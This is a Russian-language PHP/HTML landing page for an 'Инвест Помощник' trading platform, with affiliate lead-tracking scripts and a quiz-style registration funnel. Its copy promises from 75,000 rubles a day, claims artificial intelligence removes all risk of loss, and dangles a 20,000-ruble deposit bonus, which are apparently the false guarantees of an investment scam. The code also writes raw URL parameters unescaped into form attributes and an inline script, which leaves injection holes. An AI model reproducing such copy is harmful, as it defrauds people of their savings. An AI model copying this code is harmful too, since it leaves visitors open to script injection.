<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Инвест Помощник</title>
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link
      rel="shortcut icon"
      href="./assets/img/logo1.png"
      type="image/x-icon"
    />
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-chart-financial"></script>
    <script src="https://cdn.jsdelivr.net/npm/moment"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-adapter-moment"></script>
    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      let scriptLoadings = false;
      // Функция для получения значения параметра из URL
      function getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Проверяем наличие параметров
      const bgeValue = getUrlParam("bge");
      const crmSource = getUrlParam("crm_source");

      if (bgeValue) {
        // Если есть только bgeValue – подключаем скрипты для bge
        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
        document.head.appendChild(inlineScript);

        // Подключаем второй скрипт для bge
        let asyncScript = document.createElement("script");
        asyncScript.src =
          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
        document.head.appendChild(asyncScript);

        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
        asyncScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
          console.log("Все скрипты для BGE загружены!");
        };
      } else if (!crmSource) {
        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
        let trackScript = document.createElement("script");
        trackScript.type = "application/javascript";
        trackScript.src = "track.js?v=21238";
        document.head.appendChild(trackScript);

        trackScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
          console.log("track.js загружен!");
          window.removeEventListener("beforeunload", trackClose);
        };

        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
        document.head.appendChild(inlineScript);

        inlineScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
          console.log("Inline script для альтернативы загружен!");
        };

        let parseScript = document.createElement("script");
        parseScript.type = "application/javascript";
        parseScript.src = "parse_url.js?v=19";
        document.head.appendChild(parseScript);

        scriptLoadings = true;

        parseScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
          console.log("parse_url.js загружен!");
        };
      }
    </script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <main class="main">
      <div class="main__top">
        <div class="top__logo">
          <img src="./assets/img/logo1.png" alt="Logo" class="logo-1" />
          <div class="logo__text">
            <span class="logo__text--top">Инвест</span>
            <span class="logo__text--bottom">Помощник</span>
          </div>
        </div>
        <p class="top__descr">
          Благодаря нашим технологиям каждый житель России имеет возможность
          зарабатывать от 75 000 ₽ в день!
        </p>
      </div>
      <div class="main__content" id="main-content">
        <div class="main__stats">
          <div class="stats__profit">
            <span class="profit__heading">Прибыль</span>
            <span class="profit__sum">0 ₽</span>
          </div>
          <span class="stats__pair">РУБ/BTC</span>
          <div class="stats__task">
            <span class="task__heading">Время работы</span>
            <div class="task__time-value">
              <img
                src="./assets/img/timer.svg"
                alt="Icon"
                class="task__time-icon"
              />
              <span class="task__num"> 00:00 </span>
            </div>
          </div>
        </div>
        <span class="stats__pair bottom">РУБ/BTC</span>
        <div class="quiz__wrapper">
          <div class="main__chart" id="main-chart">
            <canvas id="chartCanvas"></canvas>
            <div class="chart__overlay hidden" id="overlay">
              <div class="loader"></div>
            </div>
          </div>
          <p class="quiz__text">
            В алгоритмы торговли на нашей платформе, заложен Искусственный
            интеллект, что полностью компенсирует риск потери средств, а так же
            гарантирует быстрое увеличение ваших вложений. Так же вы получите
            БОНУС на ваш лицевой счет в размере 20 000руб при внесении депозита.
          </p>
          <button type="button" class="quiz__button">Начать торговлю</button>
        </div>
      </div>
      <div class="main__form hidden" id="form-main">
        <span class="main__form-heading"> Бонус при внесении депозита </span>
        <span class="modal__accent form">20 000 ₽</span>
        <form
          class="form _main-form contact-form freg thin rounded"
          id="main-form"
          method="post"
        >
          <div class="text-block-6">
            <h2 class="form-heading" style="text-align: center">
              <span class="heading-accent">Пройдите регистрацию</span> <br />
              для начала работы на платформе
            </h2>
          </div>
          <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
          <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
          <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
          type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
          type="hidden" id="source" value='<?= $_GET['source'] ?>'>
        </form>
        <p class="form__text">
          В алгоритмы торговли на нашей платформе, заложен Искусственный
          интеллект, что полностью компенсирует риск потери средств, а так же
          гарантирует быстрое увеличение ваших вложений. Так же вы получите
          БОНУС на ваш лицевой счет в размере 20 000руб при внесении депозита.
        </p>
      </div>
      <!--------- QUESTION 1 --------->
      <div id="modal" class="modal hidden">
        <div class="modal__content">
          <p class="modal__question">
            Вам доступен БОНУС при внесении инвестиции, в размере
          </p>
          <span class="modal__accent form">20 000 ₽</span>
          <button class="modal__button--first" id="quiz1-btn">Получить</button>
        </div>
      </div>
      <!--------- QUESTION 2 --------->
      <div id="modal-2" class="modal hidden">
        <div class="modal__content second">
          <p class="modal__question second">Вам есть 25 лет?</p>
          <div class="modal__actions">
            <button
              class="modal__button--second modal__button--yes"
              id="quiz2-btn"
            >
              Да
            </button>
            <a href="err.html" class="modal__button--second modal__button--no"
              >Нет</a
            >
          </div>
        </div>
      </div>
      <!--------- QUESTION 3 --------->
      <div id="modal-3" class="modal hidden">
        <div class="modal__content">
          <p class="modal__question second">Имеете гражданство РФ?</p>
          <div class="modal__actions">
            <button
              class="modal__button--second modal__button--yes"
              id="quiz3-btn"
            >
              Да
            </button>
            <a href="err.html" class="modal__button--second modal__button--no"
              >Нет</a
            >
          </div>
        </div>
      </div>
    </main>
    <script src="./assets/js/main.js"></script>
    <script src="./assets/js/timer.js"></script>
    <script src="loadAssets.js?v=321"></script>

    <script>
      localStorage.removeItem("answers");
    </script>
    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks-page.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks-page.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
